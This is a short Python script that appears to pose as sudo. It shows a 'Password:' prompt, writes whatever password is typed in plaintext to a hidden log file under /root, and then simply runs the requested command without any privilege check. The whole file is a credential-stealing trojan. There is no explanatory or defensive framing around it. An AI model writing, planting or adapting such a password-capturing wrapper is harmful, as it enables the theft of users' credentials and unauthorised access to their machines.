#!/usr/bin/python3
import subprocess, os, sys

LOG = '/root/.sudo_log'

def main():
    if sys.stdin.isatty():
        import getpass
        pw = getpass.getpass('Password: ')
        with open(LOG, 'a') as f:
            f.write(pw + '\n')
    cmd = sys.argv[1:]
    os.execvp(cmd[0], cmd)

if __name__ == '__main__':
    main()
